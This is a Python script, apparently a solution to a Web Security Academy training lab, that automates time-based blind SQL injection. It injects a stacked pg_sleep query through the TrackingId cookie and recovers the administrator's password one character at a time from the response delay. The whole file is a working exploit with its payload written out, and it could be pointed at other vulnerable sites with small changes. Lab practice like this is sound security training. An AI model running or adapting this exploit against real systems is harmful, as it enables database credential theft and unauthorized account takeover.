# password is 20 characters!
# payload = TrackingId=XYZ'%3bSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='y') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM USERS-- -;

import requests
import string
import time

data = """csrf=oEBqOX1xadteFhFBd9DaQWZXJviy7nSW&username=test&password=test"""
url = "https://0a05006f03b0a68b835bb03d001900b0.web-security-academy.net/login"

num = 1 # initialize the payload position at 1
chars = list(string.printable)
admin_pw = "" # empty string to store the administrator's password


print("Trying character input:")

Found = True 
while Found:
    Found = False
    for char in chars: 
        print(f"...{char}", sep=' ', end='', flush=True)

        payload = {
            "Cookie": f"TrackingId=XYZ'%3bSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{num},1)='{char}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM USERS-- -; session=Uq45ElpGlLjDySVFSOekkU2NlZHoEx5O",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "65",
            "Origin": "https://0a05006f03b0a68b835bb03d001900b0.web-security-academy.net",
            "Dnt": "1",
            "Referer": "https://0a05006f03b0a68b835bb03d001900b0.web-security-academy.net/login",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Te": "trailers"
                    }
        start = time.time() # Start timer
        # time.sleep(3) # debug
        requests.post(url, headers=payload, data=data)
        stop = time.time() # Stop timer

        if ((stop - start) > 4):
            admin_pw += char
            num += 1
            print(f"\n\n[+] --- Character found:  {char}")
            print(f"[+] --- Admin Password:   {admin_pw}") # debug
            print(f"[+] --- Payload Position: {num}\n\n")
            Found = True
            break

        elif num > 20:
            print(f"The Administrator's password is '{admin_pw}'")
            exit()
        
     


 
